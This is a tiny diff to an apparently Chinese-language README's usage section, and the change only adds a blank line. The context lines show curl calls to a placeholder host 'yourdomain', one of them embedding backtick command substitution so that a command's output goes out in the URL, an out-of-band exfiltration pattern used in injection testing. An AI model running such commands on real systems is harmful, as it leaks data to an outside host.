@@ -6,6 +6,7 @@
 ## 简单用法
 
 >curl yourdomain/user/payload
+
 >curl yourdomain/user/`command`
 
 
